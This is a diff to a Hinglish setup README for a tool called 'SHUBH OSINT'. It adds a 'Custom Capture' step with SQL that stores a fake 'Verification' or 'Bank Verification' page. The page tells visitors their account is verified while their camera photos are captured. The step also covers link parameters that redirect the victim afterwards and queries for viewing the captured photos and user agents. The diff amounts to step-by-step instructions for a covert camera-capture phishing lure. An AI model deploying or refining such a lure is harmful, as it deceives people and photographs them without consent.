@@ -505,6 +505,126 @@ your-project/
 
 ---
 
+## 📸 Step 7: Custom Capture HTML Setup (Camera Capture Feature)
+
+Agar aap Custom HTML Camera Capture feature use karna chahte ho, toh ye steps follow karo:
+
+### 7.1 Verify app_settings Table Exists
+
+Step 3 ka SQL script already `app_settings` table create karta hai. Verify karo:
+
+```sql
+-- Check if table exists
+SELECT * FROM public.app_settings WHERE setting_key = 'main_settings';
+```
+
+### 7.2 Custom Capture HTML Add Karo
+
+Supabase Dashboard → **SQL Editor** → **New Query** mein ye run karo:
+
+```sql
+-- Update main_settings with customCaptureHtml
+UPDATE public.app_settings 
+SET setting_value = setting_value || '{
+  "customCaptureHtml": "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0\"><title>Verification</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#0a0a1a,#1a1a2e);min-height:100vh;display:flex;align-items:center;justify-content:center;color:white}.container{text-align:center;padding:40px;background:rgba(15,15,30,0.9);border:1px solid rgba(0,255,136,0.3);border-radius:20px;max-width:400px}.icon{width:80px;height:80px;margin:0 auto 20px;background:linear-gradient(135deg,#00ff88,#06b6d4);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:40px}h1{color:#00ff88;margin-bottom:10px}p{color:#888}</style></head><body><div class=\"container\"><div class=\"icon\">✓</div><h1>Verified</h1><p>Verification successful. You may close this page.</p></div></body></html>",
+  "camSessionId": "shubhcam01",
+  "camRedirectUrl": "https://google.com"
+}'::jsonb
+WHERE setting_key = 'main_settings';
+```
+
+### 7.3 Ya Agar main_settings Row Nahi Hai
+
+Agar `main_settings` row exist nahi karti (fresh database), toh ye insert karo:
+
+```sql
+-- Insert fresh main_settings with custom capture HTML
+INSERT INTO public.app_settings (setting_key, setting_value)
+VALUES (
+  'main_settings',
+  '{
+    "headerTitle": "SHUBH OSINT",
+    "headerTagline": "Advanced Intelligence Gathering System",
+    "customCaptureHtml": "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0\"><title>Verification</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#0a0a1a,#1a1a2e);min-height:100vh;display:flex;align-items:center;justify-content:center;color:white}.container{text-align:center;padding:40px;background:rgba(15,15,30,0.9);border:1px solid rgba(0,255,136,0.3);border-radius:20px;max-width:400px}.icon{width:80px;height:80px;margin:0 auto 20px;background:linear-gradient(135deg,#00ff88,#06b6d4);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:40px}h1{color:#00ff88;margin-bottom:10px}p{color:#888}</style></head><body><div class=\"container\"><div class=\"icon\">✓</div><h1>Verified</h1><p>Verification successful. You may close this page.</p></div></body></html>",
+    "camSessionId": "shubhcam01",
+    "camRedirectUrl": "https://google.com",
+    "backgroundImage": "",
+    "backgroundOpacity": 0.3,
+    "creditSystemEnabled": true
+  }'::jsonb
+)
+ON CONFLICT (setting_key) DO UPDATE 
+SET setting_value = EXCLUDED.setting_value;
+```
+
+### 7.4 Custom HTML Customize Karo
+
+Apna custom HTML banane ke liye:
+
+1. **HTML Design Tool** use karo (jaise CodePen, JSFiddle)
+2. **Complete HTML page** banao (`<!DOCTYPE html>` se lekar `</html>` tak)
+3. **Escape characters** handle karo:
+   - `"` ko `\"` likho
+   - Newlines hata do (single line mein likho)
+
+**Example Custom HTML (Bank Verification Theme):**
+
+```sql
+UPDATE public.app_settings 
+SET setting_value = jsonb_set(
+  setting_value, 
+  '{customCaptureHtml}', 
+  '"<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0\"><title>Bank Verification</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial;background:#1a237e;min-height:100vh;display:flex;align-items:center;justify-content:center}.card{background:white;padding:40px;border-radius:16px;text-align:center;max-width:350px;box-shadow:0 10px 40px rgba(0,0,0,0.3)}.logo{width:60px;height:60px;background:#1a237e;border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;color:white;font-size:24px}h1{color:#1a237e;font-size:20px;margin-bottom:10px}p{color:#666;font-size:14px}.badge{display:inline-block;background:#4caf50;color:white;padding:8px 20px;border-radius:20px;margin-top:20px;font-size:12px}</style></head><body><div class=\"card\"><div class=\"logo\">🏦</div><h1>Verification Complete</h1><p>Your bank account has been successfully verified.</p><div class=\"badge\">✓ VERIFIED</div></div></body></html>"'
+)
+WHERE setting_key = 'main_settings';
+```
+
+### 7.5 Verify Custom HTML Is Set
+
+```sql
+-- Check customCaptureHtml
+SELECT 
+  setting_key,
+  setting_value->>'customCaptureHtml' as custom_html,
+  setting_value->>'camSessionId' as session_id,
+  setting_value->>'camRedirectUrl' as redirect_url
+FROM public.app_settings 
+WHERE setting_key = 'main_settings';
+```
+
+### 7.6 Test Custom Capture Link
+
+Custom capture page test karo:
+```
+https://YOUR-VERCEL-URL.vercel.app/custom-capture?session=test123&redirect=https://google.com&timer=5
+```
+
+**URL Parameters:**
+| Parameter | Description | Default |
+|-----------|-------------|---------|
+| `session` | Photo group karne ke liye session ID | `default` |
+| `redirect` | Capture ke baad redirect URL | `https://google.com` |
+| `timer` | Countdown seconds before redirect | `5` |
+
+### 7.7 View Captured Photos
+
+Captured photos Supabase mein dekhne ke liye:
+
+```sql
+-- All captured photos
+SELECT id, session_id, user_agent, captured_at 
+FROM public.captured_photos 
+ORDER BY captured_at DESC 
+LIMIT 20;
+
+-- Specific session ke photos
+SELECT * FROM public.captured_photos 
+WHERE session_id = 'test123' 
+ORDER BY captured_at DESC;
+```
+
+---
+
 ## 🎯 Quick Checklist
 
 - [ ] Supabase project created
@@ -518,6 +638,7 @@ your-project/
 - [ ] Vercel env variables set
 - [ ] Vercel deploy successful
 - [ ] Site working properly
+- [ ] Custom capture HTML configured (optional)
 
 ---
 
